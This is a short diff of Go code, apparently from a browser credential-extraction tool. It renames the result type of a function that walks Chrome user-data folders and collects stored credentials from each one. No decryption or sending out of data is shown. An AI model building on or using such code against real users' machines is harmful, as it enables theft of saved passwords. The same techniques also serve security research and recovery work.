@@ -68,9 +68,9 @@ func ChromeModuleStart(path string) ([]common.CredentialsData, bool){
 	return nil, false
 }
 
-func ChromeExtractDataRun() common.ExtractDataResult{
-	var Result common.ExtractDataResult
-	var EmptyResult = common.ExtractDataResult{false,Result.Data}
+func ChromeExtractDataRun() common.ExtractCredentialsResult {
+	var Result common.ExtractCredentialsResult
+	var EmptyResult = common.ExtractCredentialsResult{false,Result.Data}
 	for i:=range chromePathsUserData {
 		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
 			var data, success = ChromeModuleStart(chromePathsUserData[i])
